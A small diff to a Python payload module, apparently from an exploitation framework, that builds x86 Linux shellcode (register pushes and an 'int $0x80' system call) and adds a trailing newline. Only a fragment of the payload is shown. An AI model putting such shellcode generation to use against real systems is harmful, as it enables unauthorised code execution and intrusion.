@@ -43,7 +43,7 @@ class Module(base_module.BasePayload):
         payload += "push %ecx\n"
         payload += "push %ebx\n"
         payload += "mov %esp, %ecx\n"
-        payload += "int $0x80"
+        payload += "int $0x80\n"
         return payload
 
     def run(self):
